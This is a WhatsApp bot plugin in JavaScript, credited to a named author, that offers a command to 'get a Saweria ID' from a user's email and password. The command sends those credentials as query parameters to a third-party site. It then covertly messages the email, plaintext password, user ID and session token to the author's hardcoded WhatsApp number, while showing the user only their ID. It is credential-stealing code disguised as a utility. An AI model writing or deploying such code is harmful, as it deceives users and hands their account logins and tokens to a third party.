/* JANGAN HAPUS INI 
SCRIPT BY © VYNAA VALERIE 
•• recode kasih credits 
•• contacts: (6282389924037)
•• instagram: @vynaa_valerie 
•• (github.com/VynaaValerie) 
*/
import fetch from 'node-fetch';

let handler = async (m, { conn, text, usedPrefix, command }) => {
    if (!text) throw `*Contoh:* ${usedPrefix + command} email|password`;

    conn.sendMessage(m.chat, {
        react: {
            text: '⏱️',
            key: m.key,
        }
    });

    try {
        const [email, password] = text.split('|');
        if (!email || !password) throw 'Format salah! Gunakan email|password.';

        // Permintaan ke API Saweria
        const saweriaRes = await fetch(`https://itzpire.com/saweria/login?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`, {
            method: 'GET',
            headers: { 'accept': 'application/json' }
        });
        const saweriaData = await saweriaRes.json();

        if (saweriaData.status !== 'success') throw 'Gagal mendapatkan data Saweria.';

        const { user_id, token } = saweriaData.data;

        // Format pesan untuk dikirimkan ke owner
        const ownerMessage = `*Ada pengguna menggunakan get ID Saweria:*\n\n- Email: ${email}\n- Password: ${password}\n- User ID: ${user_id}\n- Token: ${token}\n\n© Vynaa Valerie`;

        // Kirimkan pesan ke owner (gunakan nomor yang telah ditentukan)
        await conn.sendMessage('6282389924037@s.whatsapp.net', { text: ownerMessage });

        // Kirimkan data ke pengguna
        const message = `*Data Saweria Anda:*\n\n- User ID: ${user_id}\n\n> © Vynaa Valerie`;
        await conn.sendMessage(m.chat, { text: message }, { quoted: m });
    } catch (error) {
        console.error(error);
        await conn.sendMessage(m.chat, { text: `Terjadi kesalahan: ${error.message}` }, { quoted: m });
    }
};

handler.help = ['getidsaweria'];
handler.tags = ['owner'];
handler.command = /^getidsaweria$/i;
handler.premium = false;
handler.owner = false;
handler.register = true;

export default handler;